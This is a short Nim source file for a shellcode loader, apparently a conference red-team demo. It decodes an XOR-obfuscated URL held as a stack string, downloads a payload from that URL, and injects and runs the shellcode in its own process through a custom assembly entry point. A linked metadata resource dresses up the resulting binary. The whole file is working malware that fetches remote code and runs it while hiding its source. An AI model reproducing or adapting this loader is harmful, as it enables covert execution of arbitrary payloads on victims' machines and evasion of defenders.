import exec_payload, get_payload
import utils/[stackstr, enc]

{.link:"metadata.res".}

proc main() {.exportc: "Main".} =
  var 
    url {.stackStringA.} = "*'=4\x7f|dr\x06\x05\x1er}yjtiss\x04\x02\x1f17g7&"
    key {.stackStringA.} = "BSIDESKC420"
    pBuffer: pointer
    sSize: int
  xorStackString(url, key) 

  if getPayloadFromUrlA(cast[cstring](url[0].addr), pBuffer, sSize):
    discard localShellcodeInjection(pBuffer, sSize)

proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """

when isMainModule:
  start()
